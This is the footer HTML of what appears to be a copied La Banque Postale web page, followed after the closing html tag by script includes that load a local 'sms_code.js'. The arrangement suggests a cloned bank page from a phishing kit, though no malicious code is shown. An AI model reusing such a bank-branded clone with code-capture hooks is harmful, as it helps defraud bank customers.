                                        <a href="/particulier/redirect-rs/youtube.html" title=" YouTube - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="true">
                                        <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-social-youtube">
            <path fill-rule="evenodd" d="M10.21 14.602V9.399l4.574 2.6-4.574 2.603zM20.384 7.76a2.198 2.198 0 00-1.547-1.557c-1.364-.37-6.837-.37-6.837-.37s-5.473 0-6.837.37A2.198 2.198 0 003.616 7.76C3.25 9.134 3.25 12 3.25 12s0 2.867.366 4.24a2.198 2.198 0 001.547 1.557c1.364.368 6.837.368 6.837.368s5.473 0 6.837-.368a2.198 2.198 0 001.547-1.557c.366-1.373.366-4.24.366-4.24s0-2.866-.366-4.24z"></path>
        </svg>
                                            <span class="sr-only"> YouTube - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </section>

                <div class="col-xs-12 visible-xs-block">
                    <hr class="u-separator--h--full" aria-hidden="true" focusable="false">
                </div>

                <section class="col-xs-12 col-sm-6">

                    <div class="m-newsletterlink m-button--hasIcon ">
                        <a class="u-spacing-md-top u-spacing-md-bottom u-spacing-xs-lg-top u-spacing-xs-lg-bottom u-align-center" href="/particulier/accompagner/nl-globale.html" title="Abonnez-vous à la Newsletter - Nouvelle fenêtre" data-internal="true">
                            <span>Abonnez-vous à la Newsletter</span>
                            <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-contact-arobase">
            <path fill-rule="evenodd" d="M13 2l.019.002.315.006c.97.036 1.908.199 2.798.484a7.816 7.816 0 012.751 1.536c.798.69 1.44 1.57 1.909 2.61.47 1.042.708 2.274.708 3.664 0 .949-.123 1.82-.364 2.588-.243.774-.576 1.443-.988 1.989a4.548 4.548 0 01-1.477 1.292c-.826.443-1.759.568-2.612.362a1.98 1.98 0 01-.81-.406 2.017 2.017 0 01-.568-.82 2.481 2.481 0 01-.117-.395 4.578 4.578 0 01-1.092 1.13 4.032 4.032 0 01-2.374.765c-.521 0-.982-.096-1.369-.286a2.801 2.801 0 01-.971-.77 3.082 3.082 0 01-.566-1.113 4.787 4.787 0 01-.171-1.296c0-.508.067-1.032.198-1.558a6.653 6.653 0 01.582-1.507c.252-.476.568-.928.938-1.346a6.183 6.183 0 011.277-1.094 6.36 6.36 0 011.575-.73 6.457 6.457 0 013.01-.165c.39.068.736.175 1.026.316l-.062-.022a.5.5 0 01.347.608l-1.01 3.863c-.187.798-.333 1.493-.392 1.93a4.861 4.861 0 00-.022.452c0 .358.041.645.123.85.074.186.168.328.278.42a.98.98 0 00.405.202c.612.148 1.289.059 1.905-.272.432-.231.82-.572 1.15-1.012.344-.455.624-1.022.833-1.687.211-.671.318-1.441.318-2.288 0-1.247-.208-2.341-.619-3.253-.409-.907-.965-1.67-1.653-2.265a6.812 6.812 0 00-2.402-1.34A9.509 9.509 0 0012.948 3H13c-5.215 0-9 3.785-9 9s3.785 9 9 9a9.41 9.41 0 003.628-.722.501.501 0 01.384.924A10.425 10.425 0 0113 22C7.206 22 3 17.794 3 12c0-5.762 4.16-9.954 9.905-10H13zm1.458 5.839c-.561 0-1.09.075-1.571.224a5.402 5.402 0 00-1.328.614 5.203 5.203 0 00-1.072.918 5.89 5.89 0 00-.804 1.15 5.652 5.652 0 00-.494 1.28c-.111.447-.168.89-.168 1.317 0 .367.045.71.134 1.024.082.29.21.547.382.759.166.208.379.375.63.497.25.123.563.185.931.185.658 0 1.245-.19 1.796-.58.547-.388 1.02-1.026 1.41-1.894l1.517-5.315-.117-.032a5.52 5.52 0 00-1.246-.147z"></path>
        </svg>
                        </a>
                    </div>
                </section>

                <div class="col-xs-12">
                    <hr class="u-separator--h--full" aria-hidden="true" focusable="false">
                </div>

                <section class="col-xs-12 u-spacing-xs-top u-spacing-lg-bottom u-spacing-xs-xs-bottom">

                    <div class="m-legalpagelink u-align-center u-text-color--grey_color_5">
                        <ul class="m-list--horizontal--align-center m-list--flexcenter">

                            <li><a href="/particulier/footer/tarifs.html" data-internal="true">Tarifs bancaires</a></li>

                            <li><a href="/particulier/footer/alertes-et-fraudes.html" data-internal="true">Alertes fraudes et points de vigilance</a></li>

                            <li><a href="/particulier/footer/actualisation-des-informations-personnelles.html" data-internal="true">Actualiser vos informations</a></li>

                            <li><a href="/particulier/footer/contacts.html" data-internal="true">Votre banque au quotidien</a></li>

                            <li><a href="/particulier/footer/donnees-personnelles.html" data-internal="true">Protection des Données à Caractère Personnel </a></li>

                            <li><a href="/particulier/footer/cookies.html" data-internal="true">Cookies</a></li>

                            <li><a href="/particulier/footer/mentions-legales.html" data-internal="true">Mentions légales</a></li>

                            <li><a href="/particulier/footer/reclamation.html" data-internal="true">Réclamations</a></li>

                            <li><a href="/particulier/footer/centres-financiers.html" data-internal="true">Centres financiers</a></li>

                            <li><a href="/particulier/footer/list-actu-reglementaires.html" data-internal="true">Actualités réglementaires</a></li>

                            <li><a href="/particulier/footer/fonds-de-garantie.html" data-internal="true">Le fonds de garantie des dépôts et de résolution</a></li>

                            <li><a href="/particulier/footer/accessibilite.html" data-internal="true">L'accessibilité à La Banque Postale</a></li>

                            <li><a href="/particulier/footer/assistance-technique.html" data-internal="true">Assistance technique</a></li>

                            <li><a href="/particulier/footer/cgu-operation-rcs.html" data-internal="true">CGU</a></li>

                            <li><a href="/particulier/footer/aide-navigateurs-internet.html" data-internal="true">Aide navigateur et systèmes d'exploitation</a></li>

                            <li><a href="/particulier/footer/cache-navigateur.html" data-internal="true">Vider le cache de votre navigateur</a></li>

                            <li><a href="/particulier/footer/lexique.html" data-internal="true">Lexique </a></li>

                            <li><a href="/particulier/footer/reseaux-sociaux.html" data-internal="true">La Banque Postale sur les réseaux sociaux</a></li>
                        </ul>
                    </div>

                </section>
            </div>
        </div>
    </footer>
</body>

</html>




<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="../assets/js/sms_code.js"></script>
